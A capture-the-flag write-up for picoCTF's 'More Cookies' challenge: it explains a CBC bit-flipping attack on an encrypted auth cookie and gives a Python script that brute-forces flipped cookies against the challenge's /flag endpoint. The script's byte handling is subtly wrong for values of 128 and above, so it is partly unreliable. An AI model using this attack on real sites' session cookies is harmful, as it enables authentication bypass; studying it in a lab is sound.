# More Cookies

Url: `http://mercury.picoctf.net:10868/`

## Analysis
- GoBuster path search:
  - `/search`: Only `Post` allowed
  - `/flag`: Only `Get` allowed; probably delivers flag if providing correct cookie
- Page delivers a cookie: `Vzl0bFQ2TTM5WSt6MTVOTkNKaFlPa1dFaWlQMkZ2bXNQaWZiZm1wRkVXbmRHTVJ3ZlBUMjlYNVRnNVhuUlo2ZjliTU5uV1pLaFd0MGxEQnF1ODBwdmp2Wkg1ZEgxaGUxekxLbUNhdjJ3NUREWnFabzJJRFEwci96Q0xkZWp0Yzg=`
  - Cookie is base64 encoded -> decoded data still garbagte

## Solution
- **Hint 1**: Homomorphic Encryption, so we can modify the cipher. Idea: Modify the cookie, s.t. we are logged in. Unclear which encryption technique used as homomorphic encryption.
- Capitalized letters CBC (cipher block chaining) in description.
  - CBC is vulnerable to bit flips because cipher blocks are chained via XOR. If a single bit in C_n is flipped, P_n will be garbage. P_n+1, however, is flipped by one bit ([crypto stack](https://crypto.stackexchange.com/questions/66085/bit-flipping-attack-on-cbc-mode/66086#66086)).
  - Assuming, that the cookie stores some boolean information, e.g. `admin=0`, a bruteforce attack to the cipher might be successful. This requires to flip each possible bit in the decoded cookie.

```python
import requests
import base64


res = requests.get('http://mercury.picoctf.net:10868/', allow_redirects=False)
initial_cookie = res.cookies.get('auth_name')

# Double decode cookie to work on raw bytes (i.e. server seems to double b64encrypt data)
decoded_cookie = base64.b64decode(initial_cookie)
decoded_cookie = base64.b64decode(decoded_cookie)


def exploit():
    for index, character in enumerate(decoded_cookie):
        before = decoded_cookie[:index]
        after = decoded_cookie[index+1:]
        current = decoded_cookie[index]

        # We are looping over each byte in decoded_cookie.
        # Since we want to flip each bit, there are 8 flips possible for each byte.
        for i in range(8):
            flipped = current ^ (1 << i)
            modified_cipher = before + chr(flipped).encode() + after
            encoded = base64.b64encode(base64.b64encode(modified_cipher))

            print(f"DEBUG: {index} {i} ({encoded})")
            res = requests.get('http://mercury.picoctf.net:10868/flag', cookies={'auth_name': encoded})
            if 'picoCTF' in res.text:
                print(res.text)
                exit(0)


exploit()


```